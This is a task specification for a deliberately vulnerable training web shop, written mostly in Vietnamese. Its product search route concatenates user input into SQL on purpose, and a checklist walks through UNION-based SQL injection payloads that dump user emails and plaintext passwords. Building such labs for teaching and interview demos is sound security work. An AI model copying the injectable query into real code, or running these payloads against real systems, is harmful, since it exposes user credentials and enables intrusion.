# Tasks 04: Products — listing + search + UNION SQLi (F01b)

> Phase 1 · Người làm: AI · Vuln cài ở task này: **F01b (UNION-based SQLi ở search)**.

---

## Dependencies

```
Cần: tasks/02 (bảng products), tasks/01 (Vite proxy /api)
```

---

## Files tạo

### ✅ app/server/src/routes/products.ts

```typescript
import { Router } from 'express';
import { pool } from '../db';

const router = Router();

// GET /api/products?category=men&q=jacket
// SELECT 6 cột (D9): id, name, description, price_cents, category, image_url
router.get('/products', async (req, res) => {
  const { category, q } = req.query;
  let sql = 'SELECT id, name, description, price_cents, category, image_url FROM products';
  const conds: string[] = [];
  const params: any[] = [];

  if (category) {                      // ← chỗ này DÙNG parameterized (đúng chuẩn)
    params.push(category);
    conds.push(`category = $${params.length}`);
  }
  if (q) {
    // VULN-01b: deliberately insecure — string concatenation vào ILIKE (UNION injection)
    // See tasks/04 + docs/guides/decisions.md (D9). DO NOT "fix".
    // Query trở thành: WHERE name ILIKE '%<q>%'
    // Payload q: ' UNION SELECT NULL,email,password,NULL,role,email FROM users--
    conds.push(`name ILIKE '%${q}%'`);   // ← KHÔNG dùng $param (cố ý)
  }
  if (conds.length > 0) sql += ' WHERE ' + conds.join(' AND ');
  sql += ' ORDER BY id';

  const { rows } = await pool.query(sql, params);   // KHÔNG try/catch → verbose error (F04-3)
  res.json(rows);
});

// GET /api/products/:id  → product + reviews của nó (join; dùng cho ProductDetail task 05)
router.get('/products/:id', async (req, res) => {
  const { rows } = await pool.query(
    'SELECT * FROM products WHERE id = $1', [req.params.id]   // parameterized — đúng chuẩn
  );
  if (rows.length === 0) return res.status(404).json({ error: 'Product not found' });
  res.json(rows[0]);
});

export default router;
```

> Ghi chú: để demo "mình biết đâu là đúng/sai" — middleware + category filter + product by id
> đều dùng parameterized query; CHỈ login (F01a) và search q (F01b) là nối chuỗi.
> Khi phỏng vấn: "tôi cố tình để 2 chỗ sai trong ~1 chục chỗ đúng — để chứng minh tôi phân biệt được".

### ✅ app/client/src/pages/Home.tsx + Products.tsx + components/ProductCard.tsx

```
Home:     hero nhỏ + grid 8 sản phẩm nổi bật (lấy /api/products) — trông như shop thật
Products: thanh category (All / Men / Women / Accessories) + ô search ?q=
          GET /api/products?category=&q= → grid ProductCard
ProductCard: ảnh (SVG), tên, giá ($xx.xx) → bấm vào /products/:id
```

---

## Verify checklist (functional)

```
□ /products → filter category chạy (men/women/accessories/all)
□ /products?q=jacket → đúng sản phẩm có "jacket"
□ Search không có kết quả → [] (không crash)
□ Search chứa ký tự lạ (ví dụ % hoặc ') → KHÔNG crash UI (API có thể 500 — đó là F04-3, UI phải bắt lỗi)
```

## Verify checklist (VULN-01b — làm NGAY)

```
□ Bước 1 — xác nhận inject được: GET /api/products?q='
   → 500 + response chứa lỗi SQL (syntax error) + query text (vừa là F04-3 verbose error)

□ Bước 2 — đếm cột bằng ORDER BY: ?q=' ORDER BY 6--   → 200 (6 cột hợp lệ)
                    và ?q=' ORDER BY 7--   → 500 (chứng tỏ chỉ có 6 cột)

□ Bước 3 — UNION dump: ?q=' UNION SELECT NULL,email,password,NULL,role,email FROM users--
   → 200 + JSON chứa 3 users kèm password PLAINTEXT (admin123, alice123, mallory123)
   Lưu ý URL-encode: ' → %27, space → %20 hoặc để Postman tự encode

□ Bước 4 (optional, kể chuyện khi phỏng vấn): nối vào 1 query lấy cả email + password
   ?q=' UNION SELECT NULL,email||':'||password,NULL,NULL,role,NULL FROM users--
   (dùng || nối chuỗi — PostgreSQL)
```

---

## Changelog + Commit

```
Commit mẫu (tách 2):
  feat(products): add product listing, category filter and search pages
  vuln(products): add UNION SQL injection in search param (deliberate — F01b)
```

---

## ⚠️ Lưu ý cho task sau (05)

```
- ProductDetail cần GET /api/products/:id + reviews → task 05 thêm phần reviews vào response
  (hoặc route riêng GET /api/products/:id/reviews — chọn 1, ghi rõ trong task 05)
```
